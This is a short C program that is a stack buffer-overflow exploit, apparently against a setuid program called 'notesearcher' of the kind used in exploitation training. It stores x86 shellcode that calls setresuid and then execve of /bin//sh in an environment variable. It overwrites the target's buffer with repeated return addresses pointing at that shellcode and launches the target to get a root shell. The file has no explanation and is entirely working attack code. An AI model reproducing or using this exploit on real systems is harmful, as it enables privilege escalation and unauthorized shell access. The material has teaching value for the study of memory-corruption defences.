#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char* argv[])
{
    char* env[2] = {shellcode, NULL};
    unsigned long long i, ret;
    char* buffer = (char*) malloc(320);

    bzero(buffer, 320);

    ret = 0x7fffffffefa3 - (sizeof(shellcode) - 1);
    for (i = 0; i < 320; i += 8)
        *((unsigned long long *)(buffer + i)) = ret;
    printf("%s", buffer);
    execle("./notesearcher", buffer, NULL, env);
    return 0;
}
